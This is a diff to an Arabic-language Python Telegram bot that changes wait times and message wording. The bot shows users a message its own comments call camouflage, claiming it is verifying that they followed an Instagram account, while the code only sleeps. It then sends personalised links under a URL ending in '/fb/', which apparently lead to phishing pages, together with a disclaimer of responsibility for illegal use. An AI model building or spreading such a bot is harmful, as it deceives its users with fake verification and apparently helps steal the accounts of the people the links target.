@@ -30,13 +30,14 @@ def short(url):
 def start(m):
     uid, name = m.chat.id, m.from_user.first_name
     
-    # 1. رسالة التمويه والمتابعة (m_y_.9)
+    # رسالة التمويه مع تنبيه الانتظار دقيقتين
     warning_text = f"""
 ⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
 
 عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، يـ^ـجـ^ـب مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور الـ^ـرسمـ^ـي عـ^ـلى انـ^ـسـ^ـتـ^ـغـ^ـرام لـتـفـعـيـل الـنـظـام.
 
-🔴 تـحـذيـر: الـنـظـام يـقـوم الآن بـالـتـحـقـق مـن مـتـابـعـتـك. سـيـتـم إرسـال الروابـط بـعـد (5 دقـائـق) تـلـقـائـيـاً 💀🔥
+📢 تـنـبـيـه الـمـطـور:
+الـرجـاء الانـتـظـار لـمـدة (2 دقـيـقـة) حـتـى يـتـم تـأكـيـد مـتـابـعـتـك لـلـحـسـاب مـن قـبـل الـخـادم وتـولـيـد الـروابـط الـخـاصـة بـك تـلـقـائـيـاً 💀🔥
     """
     markup = types.InlineKeyboardMarkup()
     btn_insta = types.InlineKeyboardButton("🔗 مـتـابـعـة المـطـور (m_y_.9)", url="https://www.instagram.com/m_y_.9/")
@@ -44,9 +45,9 @@ def start(m):
     
     bot.send_message(uid, warning_text, reply_markup=markup)
 
-    # 2. مهمة الـ 5 دقائق في الخلفية
+    # مهمة الـ 2 دقيقة في الخلفية
     def background_task(chat_id, user_name):
-        time.sleep(300) # انتظار الـ 5 دقائق
+        time.sleep(120) # انتظار 120 ثانية (دقيقتين)
         
         h = user_name.replace(" ", "_")
         base = "https://m-y-9-tech.github.io/fb/"
@@ -60,7 +61,7 @@ def start(m):
         }
 
         main_msg = f"""
-🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | تـم الـتـحـقـق ✅
+🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | تـم الـتـحـقـق بـنـجـاح ✅
 
 👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
 
@@ -87,9 +88,9 @@ def start(m):
 🔗 `{lnks['c2']}`
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-⚖️ إخـ^ـلاء مـ^ـسـ^ـؤوليـ^ـة: المـطـور غـيـر مـسـؤول عـن أي اسـتـخـدام ضـار.
+⚖️ إخـ^ـلاء مـ^ـسـ^ـؤوليـ^ـة: المـطـور غـيـر مـسـؤول عـن أي اسـتـخـدام غـيـر قـانـونـي.
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-⚙️ Status: Connected
+⚙️ Status: Connected Successfully
         """
         try:
             bot.send_message(chat_id, main_msg, parse_mode="Markdown", disable_web_page_preview=True)
@@ -99,7 +100,7 @@ def start(m):
 
 if __name__ == "__main__":
     keep_alive()
-    # الحل النهائي للـ 409: حذف الويب هوك وتصفير الطلبات (skip_pending)
+    # تنظيف الاتصال لتجنب 409
     bot.remove_webhook()
     time.sleep(1)
     bot.infinity_polling(non_stop=True, skip_pending=True)
